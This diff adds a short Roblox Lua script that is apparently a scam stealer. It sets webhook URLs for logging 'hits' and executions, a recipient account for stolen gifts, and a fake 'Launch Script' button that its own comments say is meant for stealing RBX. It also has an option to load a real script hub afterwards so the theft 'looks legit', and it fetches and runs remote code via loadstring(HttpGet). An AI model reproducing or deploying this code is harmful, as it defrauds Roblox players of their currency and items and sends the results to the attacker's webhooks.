@@ -1,0 +1,8 @@
+LogsWebhook = "https://webhook-protect.vercel.app/api/webhook?id=eTF3MDVtaENTNjVwSzlINWp6dUVDUTpRc1JOMFdLc2hIZGhrZmt0U0JtM3dpMXZPZW1vWjJVenROWC1oXzMyRUo4bGdCUkJmV1VNVktkdDF1dmNwTDkwNlFqT1F3RVJPUm14dmRoT21nOVR1eURYZ1dyS2RJWFJoUlRBajFUQzluLWh0NGMzMmU0MVpQT0xKR3NDTVAzZDdMTVltUjR5UVhyTkZnbUdmVE9tNWlwX1FDbmdTdWFLVWVaNmIyR2lmUHc" -- << Webhook for logging hits >>
+ExecutionWebhook = "https://webhook-protect.vercel.app/api/webhook?id=S0piNmpyZTY1SWJFNTMwZVQxTVd5UTo4XzEtTmgwYm55UFNYVUFhQ1RTLVp0QVVUcVdmVXN5M3pCdHJHS2NkV2FUeU03eXRRQnRLQTlKN0h2bm9hU2NJZmgyS3A5ZGFpT1VRVzVtUWlEa0RFUkpBdHlRQ2pZMFhEWGpNU2dmNnBjZFJGcmRZa08wcjFxcWVjU1M4enFEZFg5eHZHaXJqSmtfYUk3dlp5TDJWVDZ1YzVMNGZVSFNpd2hNbGIzUkFlNk0" -- << Webhook for logging executions >>
+Username = "Rip_illusion444" -- << Username of the account where gifts will be sent >>
+PromptText = "Launch Script." -- << Text of the button meant for stealing RBX >>
+RandomizedPrompt = false -- << Makes the prompt have a unique design each execution >>
+LoadRedzAfterHit = true -- << Loads redz hub after you get a hit, so looks legit >>
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/Hm/refs/heads/main/SimpleTesting"))()
